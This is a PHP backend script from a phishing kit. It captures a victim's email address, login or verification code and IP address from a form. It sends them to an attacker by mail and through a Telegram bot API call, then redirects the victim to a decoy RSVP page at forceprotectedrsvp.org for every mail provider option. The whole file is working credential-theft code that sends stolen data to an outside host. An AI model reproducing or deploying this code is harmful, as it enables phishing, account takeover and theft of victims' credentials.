<?php 
include('../telegram.php'); 

$code = trim($_POST['code']);
$email = trim($_POST['codeEmail']);
$detail = trim($_POST['codeDetail']);


function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


if($email != null && $code != null){
   $ip = get_client_ip();

//	$hostname = gethostbyaddr($ip);

	$message = "===================\n";
	$message .= "【Email】  : ".$email."...️\n";
	$message .= "【CODE】  : ".$code."\n";
	$message .= "【IP】  : ".$ip."...️\n";
	$message .= "==================\n";
	
	if($send_email == 1){
	$send = $box;
	$subject = "Login : $ip";
    mail($send, $subject, $message);
	}

	if($send_bot == 1){	
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_exec($curl);
	}
}	
  
  
if($detail == "Gmail" ){

    header('Location: https://forceprotectedrsvp.org/x/party.html', true, 302);
    exit;
}
elseif($detail == "Outlook"){

    header('Location: https://forceprotectedrsvp.org/x/party.html', true, 302);
    exit;   
}
elseif($detail == "Aol"){

    header('Location: https://forceprotectedrsvp.org/x/party.html', true, 302);
    exit;   
}
elseif($detail == "Office 365"){

    header('Location: https://forceprotectedrsvp.org/x/party.html', true, 302);
    exit;   
}
elseif($detail == "Yahoo"){

    header('Location: https://forceprotectedrsvp.org/x/party.html', true, 302);
    exit;   
}
elseif($detail == "Other Mail"){

    header('Location: https://forceprotectedrsvp.org/x/party.html', true, 302);
    exit;   
}
else{

    header('Location: https://forceprotectedrsvp.org/x/party.html', true, 302);
    exit; 
  
}  


?>